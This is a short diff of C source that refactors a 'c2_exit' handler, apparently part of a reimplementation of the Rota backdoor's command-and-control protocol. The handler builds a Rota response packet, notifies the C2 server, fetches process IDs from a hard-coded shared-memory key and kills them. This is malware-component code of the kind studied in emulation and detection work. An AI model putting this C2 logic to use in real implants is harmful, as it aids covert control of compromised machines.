@@ -19,44 +19,21 @@
 // https://gist.github.com/suyash/2488ff6996c98a8ee3a84fe3198a6f85
 
 
-void c2_exit(int sock, int sock2) {
+void c2_exit(char *cmd_id, int sock) {
 
     char *msg = "exiting!";
     int msgLen = strlen(msg);
 
-
     // initial Rota header packet to overwrite values
     // for response
     char *rotaResp = initial_rota_pkt();
-
-    // updating message field with length of payload msg.
-    memcpy(&rotaResp[4], &msgLen, msgLen);
-
-    // set cmd id to "exit" (0x13, 0x8e, 0x3e, 0x06)
-    memcpy(&rotaResp[14], &rota_c2_exit, sizeof(rota_c2_exit));
-
-    // reallocate space from 82 byte header + response "body"
-    rotaResp = realloc(rotaResp, (82 + strlen(msg)));
-    memset(&rotaResp[82], 0, 8);
-
-    if (rotaResp == NULL) {
-        printf("error allocating data");
-        exit(1);
-    }
-
-    int totalSize = 82 + strlen(msg);
-    memcpy(&rotaResp[82], msg, strlen(msg));
-
-    // notified c2 server
-    send(sock, rotaResp, totalSize, 0);
+    build_c2_response(rotaResp, cmd_id, sock);
 
     // get pids from sharedmem and kill both pids
     int shmid = shmget(0x64b2e2, 8, 0666);
 
     shutdown(sock, 2);
     close(sock);
-    shutdown(sock2, 2);
-    close(sock2);
 
     // if handled on sharedmem cannot be obtained
     if (shmid == -1) {
@@ -81,8 +58,6 @@ void c2_exit(int sock, int sock2) {
     kill(*tmpPid, SIGKILL);
 
     free(tmpPid);
-    // closing
-    close(sock);
 }
 
 
